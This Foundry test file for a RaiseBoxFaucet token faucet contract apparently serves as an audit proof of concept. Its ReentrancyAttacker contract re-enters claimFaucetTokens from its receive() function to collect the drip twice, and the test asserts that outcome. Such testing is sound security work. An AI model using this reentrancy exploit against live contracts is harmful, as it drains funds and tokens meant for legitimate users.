// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../lib/forge-std/src/Test.sol";
import {RaiseBoxFaucet} from "../src/RaiseBoxFaucet.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {DeployRaiseboxContract} from "../script/DeployRaiseBoxFaucet.s.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestRaiseBoxFaucet is Test {
    RaiseBoxFaucet raiseBoxFaucet;
    DeployRaiseboxContract raiseBoxDeployer;

    // Test: Users
    address user1 = makeAddr("user1");

    address owner;
    address raiseBoxFaucetContractAddress;

    // test constants
    uint256 public constant INITIAL_SUPPLY_MINTED = 1000000000 * 10 ** 18;

    /**
     * @dev Helper function to simulate time passing since testing environment doesn't work as expected
     * @param duration_ amount of time to advanced, could be in days, hours, minutes or seconds. default is seconds*
     */
    function advanceBlockTime(uint256 duration_) internal {
        vm.warp(duration_);
    }

    function setUp() public {
        owner = address(this);

        raiseBoxFaucet = new RaiseBoxFaucet("raiseboxtoken", "RB", 1000 * 10 ** 18, 0.005 ether, 0.5 ether);

        raiseBoxFaucetContractAddress = address(raiseBoxFaucet);

        raiseBoxDeployer = new DeployRaiseboxContract();

        vm.deal(raiseBoxFaucetContractAddress, 1 ether);
        vm.deal(owner, 100 ether);

        advanceBlockTime(3 days); // 3 days
    }

    function testReentrancyAttack() public {
        vm.startPrank(user1);

        ReentrancyAttacker attacker = new ReentrancyAttacker();
        attacker.attack(raiseBoxFaucet);
        assertEq(raiseBoxFaucet.balanceOf(user1), raiseBoxFaucet.faucetDrip() * 2);

        vm.stopPrank();
    }
}

contract ReentrancyAttacker {
    function attack(RaiseBoxFaucet raiseBoxFaucet_) public {
        raiseBoxFaucet_.claimFaucetTokens();
        raiseBoxFaucet_.transfer(msg.sender, raiseBoxFaucet_.balanceOf(address(this)));
    }

    receive() external payable {
        RaiseBoxFaucet raiseBoxFaucet = RaiseBoxFaucet(payable(msg.sender));
        if (raiseBoxFaucet.getUserLastClaimTime(address(this)) + 3 days <= block.timestamp) {
            raiseBoxFaucet.claimFaucetTokens();
        }
    }
}
